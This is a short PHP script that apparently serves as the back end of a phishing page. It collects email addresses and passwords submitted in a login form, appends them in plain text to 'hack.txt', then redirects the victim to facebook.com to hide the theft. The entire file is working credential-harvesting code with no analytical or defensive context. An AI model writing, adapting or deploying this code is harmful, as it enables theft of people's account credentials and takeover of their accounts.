<?php

	if($_SERVER['REQUEST_METHOD'] == 'POST'){
    
    	$email = isset($_POST['email']) ? $_POST['email'] : '';
        $pass= isset($_POST['pass']) ? $_POST['pass'] : '';
            
    	file_put_contents('hack.txt', "EMAIL=$email, PASSWORD=$pass\n", FILE_APPEND);
            
    	header('Location: https://www.facebook.com/');
    }

	

?>